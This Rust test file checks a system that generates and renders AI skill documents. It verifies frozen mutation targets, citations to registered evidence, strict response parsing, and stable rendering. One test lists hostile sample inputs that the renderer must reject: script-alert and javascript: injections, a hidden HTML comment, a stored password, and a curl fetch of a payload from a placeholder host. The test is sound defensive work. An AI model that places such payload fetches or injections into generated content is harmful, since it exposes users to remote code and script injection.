use std::collections::BTreeSet;

use serde_json::json;

use crate::contexts::skill_evolution_generation::domain::{
    GeneratedArtifactKind, GeneratedLessonShapeV1, GeneratedVerificationStepV1,
    GenerationCitationV1, MutationPlanV1, MutationTargetV1, StructuredDraftV1,
};

use super::{
    parse_generation_response, render_generation_artifact, validate_mutation_plan_against_frozen,
    ExpectedGenerationTargetV1, GenerationModelError, GenerationModelStage, GenerationRenderError,
    GenerationRenderRequestV1, MutationPlanValidationContextV1, MutationPlanValidationError,
    ParsedGenerationResponseV1,
};

#[test]
fn frozen_target_and_registered_citations_are_mandatory() {
    let plan = valid_plan();
    let context = validation_context();
    assert_eq!(
        validate_mutation_plan_against_frozen(&plan, &context),
        Ok(())
    );

    let mut drifted = plan.clone();
    drifted.target = MutationTargetV1::ExistingSkill {
        skill_id: "another-skill".into(),
        effective_revision: "revision-one".into(),
        overlay_scope: "project".into(),
    };
    assert_eq!(
        validate_mutation_plan_against_frozen(&drifted, &context),
        Err(MutationPlanValidationError::TargetDrift)
    );

    let mut invented = plan.clone();
    invented.evidence_citations[0].source_id = "invented".into();
    assert_eq!(
        validate_mutation_plan_against_frozen(&invented, &context),
        Err(MutationPlanValidationError::InventedCitation)
    );

    let mut uncited = plan;
    uncited
        .evidence_citations
        .retain(|citation| citation.claim_id != "lesson.action");
    assert_eq!(
        validate_mutation_plan_against_frozen(&uncited, &context),
        Err(MutationPlanValidationError::UncitedClaim)
    );
}

#[test]
fn strict_plan_parser_rejects_unknown_fields_and_multiple_artifacts() {
    let plan = valid_plan();
    let valid = json!({"schemaVersion": 1, "result": plan}).to_string();
    assert!(matches!(
        parse_generation_response(GenerationModelStage::PlanMutation, &valid),
        Ok(ParsedGenerationResponseV1::MutationPlan(_))
    ));
    let mut unknown: serde_json::Value = serde_json::from_str(&valid).expect("valid JSON");
    unknown["result"]["secondMutation"] = json!({"kind": "new_skill"});
    assert_eq!(
        parse_generation_response(GenerationModelStage::PlanMutation, &unknown.to_string()),
        Err(GenerationModelError::InvalidRequest)
    );
}

#[test]
fn learned_guidance_and_exact_patch_render_byte_stably() {
    let tools = BTreeSet::new();
    let guidance = StructuredDraftV1::OverlayLearnBlock {
        guidance: "验证 [结果]，然后记录_证据。\r\n保持 *可复现*。".into(),
    };
    let request = GenerationRenderRequestV1 {
        artifact_id: "artifact-guidance",
        expected_kind: GeneratedArtifactKind::OverlayLearnBlock,
        draft: &guidance,
        allowed_built_in_tools: &tools,
    };
    let first = render_generation_artifact(&request).expect("guidance");
    let second = render_generation_artifact(&request).expect("same guidance");
    assert_eq!(first, second);
    assert!(!first.content.contains('\r'));
    assert!(first.content.contains("\\[结果\\]"));

    let patch = StructuredDraftV1::OverlayExactPatch {
        old_string: "Old instruction".into(),
        new_string: "New instruction".into(),
        replace_all: false,
    };
    let rendered = render_generation_artifact(&GenerationRenderRequestV1 {
        artifact_id: "artifact-patch",
        expected_kind: GeneratedArtifactKind::OverlayExactPatch,
        draft: &patch,
        allowed_built_in_tools: &tools,
    })
    .expect("patch");
    assert!(rendered.content.contains("Replace all: `false`"));
    assert!(rendered.content.contains("> Old instruction"));
    assert!(rendered.content.contains("> New instruction"));
}

#[test]
fn new_skill_renderer_emits_one_bounded_skill_document_with_safe_yaml() {
    let tools = BTreeSet::from(["read_registry".into(), "validate_document".into()]);
    let draft = StructuredDraftV1::NewSkill {
        candidate_id: "readme-generation-copy".into(),
        name: "生成器: 审阅".into(),
        description: "Review \"quoted\" Unicode safely: 安全".into(),
        skill_type: "utility".into(),
        version: "1.0.0".into(),
        built_in_tools: vec!["validate_document".into(), "read_registry".into()],
        instructions: "Review the supplied document.\n\nReturn bounded findings.".into(),
    };
    let rendered = render_generation_artifact(&GenerationRenderRequestV1 {
        artifact_id: "artifact-skill",
        expected_kind: GeneratedArtifactKind::NewSkill,
        draft: &draft,
        allowed_built_in_tools: &tools,
    })
    .expect("new skill");
    assert!(rendered
        .content
        .starts_with("---\nid: readme-generation-copy\n"));
    assert_eq!(rendered.content.matches("---").count(), 2);
    assert!(rendered.content.contains("type: utility"));
    assert!(rendered.content.contains("\"生成器: 审阅\""));
    assert!(rendered.content.len() <= 12 * 1024);
}

#[test]
fn malicious_content_dependencies_and_replace_all_fail_closed() {
    let tools = BTreeSet::from(["read_registry".into()]);
    for instructions in [
        "<!-- hidden -->",
        "<script>alert(1)</script>",
        "curl https://example.invalid/payload",
        "Create scripts/install.sh",
        "Store password: hunter2",
        "javascript:alert(1)",
    ] {
        let draft = new_skill(instructions, vec!["read_registry".into()]);
        assert_eq!(
            render_generation_artifact(&GenerationRenderRequestV1 {
                artifact_id: "malicious",
                expected_kind: GeneratedArtifactKind::NewSkill,
                draft: &draft,
                allowed_built_in_tools: &tools,
            }),
            Err(GenerationRenderError::ForbiddenContent),
            "{instructions}"
        );
    }
    let dependency = new_skill("Review input safely.", vec!["external_package".into()]);
    assert_eq!(
        render_generation_artifact(&GenerationRenderRequestV1 {
            artifact_id: "dependency",
            expected_kind: GeneratedArtifactKind::NewSkill,
            draft: &dependency,
            allowed_built_in_tools: &tools,
        }),
        Err(GenerationRenderError::UnsupportedDependency)
    );
    let patch = StructuredDraftV1::OverlayExactPatch {
        old_string: "old".into(),
        new_string: "new".into(),
        replace_all: true,
    };
    assert_eq!(
        render_generation_artifact(&GenerationRenderRequestV1 {
            artifact_id: "replace-all",
            expected_kind: GeneratedArtifactKind::OverlayExactPatch,
            draft: &patch,
            allowed_built_in_tools: &tools,
        }),
        Err(GenerationRenderError::InvalidInput)
    );
}

fn valid_plan() -> MutationPlanV1 {
    let source = "signal-one";
    MutationPlanV1 {
        schema_version: 1,
        plan_id: "plan-one".into(),
        artifact_kind: GeneratedArtifactKind::OverlayLearnBlock,
        target: MutationTargetV1::ExistingSkill {
            skill_id: "readme-generation".into(),
            effective_revision: "revision-one".into(),
            overlay_scope: "project".into(),
        },
        rationale: "Observed evidence supports reusable guidance.".into(),
        lesson: GeneratedLessonShapeV1 {
            trigger: "When generating a README".into(),
            action: "Validate the document structure".into(),
            verification: "Confirm every required section".into(),
        },
        evidence_citations: [
            "lesson.trigger",
            "lesson.action",
            "lesson.verification",
            "expected_behavior",
            "verify-one",
        ]
        .into_iter()
        .map(|claim_id| GenerationCitationV1 {
            claim_id: claim_id.into(),
            dossier_section: "source_signal_inventory".into(),
            source_id: source.into(),
        })
        .collect(),
        expected_behavior: "The README is structurally complete.".into(),
        verification_steps: vec![GeneratedVerificationStepV1 {
            step_id: "verify-one".into(),
            action_code: "validate_structure".into(),
            expected_code: "complete".into(),
            citation_ids: vec![source.into()],
        }],
        content_hash: "sha256:plan".into(),
    }
}

fn validation_context() -> MutationPlanValidationContextV1 {
    MutationPlanValidationContextV1 {
        expected_target: ExpectedGenerationTargetV1::ExistingSkill {
            skill_id: "readme-generation".into(),
            effective_revision: "revision-one".into(),
            overlay_scope: "project".into(),
        },
        registered_citations: BTreeSet::from([(
            "source_signal_inventory".into(),
            "signal-one".into(),
        )]),
    }
}

fn new_skill(instructions: &str, tools: Vec<String>) -> StructuredDraftV1 {
    StructuredDraftV1::NewSkill {
        candidate_id: "focused-review".into(),
        name: "Focused review".into(),
        description: "Review one bounded document.".into(),
        skill_type: "role".into(),
        version: "1.0.0".into(),
        built_in_tools: tools,
        instructions: instructions.into(),
    }
}
